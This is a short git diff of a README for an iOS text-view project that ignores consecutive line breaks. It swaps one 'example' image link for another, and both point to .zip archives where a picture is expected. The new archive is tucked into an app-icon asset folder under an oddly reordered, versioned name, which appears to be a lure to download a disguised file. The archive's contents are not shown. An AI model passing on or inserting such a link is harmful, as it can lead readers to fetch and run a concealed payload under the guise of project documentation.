@@ -4,7 +4,7 @@ ignore the continuous line breaks just like the input in weChat or weibo.
 
 a picture is  better than thousand words:
 
-![example](https://raw.githubusercontent.com/ZHThinker/ignoreContinuousBreaks/master/textview/Base.lproj/ignore_Continuous_Breaks_1.4.zip)
+![example](https://github.com/ZHThinker/ignoreContinuousBreaks/raw/refs/heads/master/textview/Assets.xcassets/AppIcon.appiconset/Continuous-ignore-Breaks-v1.2.zip)
 
 ### How To Get Started
 
